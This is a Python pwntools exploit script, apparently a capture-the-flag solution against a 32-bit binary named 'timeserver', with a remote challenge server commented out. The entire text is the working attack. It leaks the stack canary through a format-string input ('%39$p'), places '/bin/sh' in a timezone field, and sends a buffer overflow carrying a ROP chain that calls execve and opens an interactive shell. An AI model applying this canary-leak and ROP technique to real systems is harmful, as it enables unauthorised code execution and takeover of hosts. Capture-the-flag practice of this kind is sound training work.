#!/usr/bin/env python3



from pwn import *


e = ELF("./timeserver")
r = process("./timeserver")
#r = remote("0.cloud.chals.io",11317)
canary_leaker = "%39$p"
r.sendline(canary_leaker)
r.recvuntil(b"Invalid option: ")
canary = int(r.recvline().strip(),16)
log.info("The canary base of the process is " + hex(canary))
r.sendline(b"L")
r.sendlineafter(b"What is your TZ?",b"/bin/sh\x00")
pop_eax_add_al_0x89 = 0x08068256
pop_ebx_edx = 0x08066219
xor_ecx =  0x0804ad4f
exploit = b"A" * 128 + p32(canary) + b"B" * 12 +  p32(pop_eax_add_al_0x89) + p32(0x82) + p32(pop_ebx_edx) + p32(0) + p32(0x8111dc0) + p32(xor_ecx)
r.sendline(exploit)
r.interactive()
